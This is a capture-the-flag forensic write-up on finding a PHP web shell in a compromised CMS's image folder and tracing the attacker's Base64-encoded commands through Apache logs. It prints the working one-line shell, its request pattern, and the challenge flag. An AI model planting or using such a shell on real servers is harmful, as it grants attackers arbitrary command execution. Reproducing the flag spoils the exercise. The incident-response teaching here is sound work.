# Infinity Shell

## Challenge Description
> ![image](https://github.com/user-attachments/assets/92609788-aa10-4422-adad-aafaec8af99a)

## Solution
Since the web app was compromised, we start by checking the default web directory:

![image](https://github.com/user-attachments/assets/44d5791b-f938-4946-9737-8f3fa8254e5e)

Inside, we find a folder called CMSsite-master, which has many files.

![image](https://github.com/user-attachments/assets/fe369089-6753-487d-8fb2-aaeba31c1fa0)

Since the attacker uploaded a web shell, the most likely place to check is where file uploads are stored. The `img` folder is a good place to start.

A suspicious file catches our eye—`images.php`. Unlike the other files in this directory, which should contain only image files, this one has a `.php` extension. This is a major red flag.

![image](https://github.com/user-attachments/assets/cb537cdd-3a6e-41fd-ba7c-52bd14bd2070)

Let’s examine its contents:
```bash
cd /var/www/html/CMSsite-master/img
cat images.php
```

![image](https://github.com/user-attachments/assets/cb5a7693-0527-41fc-bbb6-fc9d8bb864d9)

Contents of images.php:
```bash
<?php system(base64_decode($_GET['query'])); ?>
```

This script takes input from a query parameter, decodes it from Base64, and executes it using the `system()` function. In other words, the attacker can send arbitrary commands to the server using a simple HTTP request:
```
/images.php?query=[Base64 command]
```

This script takes input from a query parameter, decodes it from Base64, and executes it using the system() function. In other words, the attacker can send arbitrary commands to the server using a simple HTTP request:

Now that we know how the attacker controlled our system, our next step is to track their activity. Since we’re dealing with an Apache2 web server, its logs will provide a timeline of events. Let’s check `/var/log/apache2`
```
cd /var/log/apache2
ls
```

![image](https://github.com/user-attachments/assets/37c073fa-f853-4bd8-ac0c-7cbeb914a4df)

Among the log files, other_vhosts_access.log.1 stands out as it contains strings `images.php` using `grep`. 
```
cat other_vhosts_access.log.1 | grep "images.php"
```

![image](https://github.com/user-attachments/assets/4f1e1570-dd64-441e-a491-76ccd5d742aa)

The log reveals multiple requests containing Base64-encoded commands.

To decode them, we can use [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)). Copying and pasting the encoded strings into CyberChef, we unveil the commands executed by the attacker.

The third query reveals the flag: 
```
THM{sup3r_34sy_w3bsh3ll}
```

![image](https://github.com/user-attachments/assets/eb8ffa2b-8053-420a-95d5-4684bd4c25db)

## Conclusion
This challenge shows how dangerous it is to allow file uploads without proper security checks. 
A simple PHP script gave the attacker full control over the server. By following the logs and decoding the commands, we found out what happened and recovered the flag.

## Flag
THM{sup3r_34sy_w3bsh3ll}
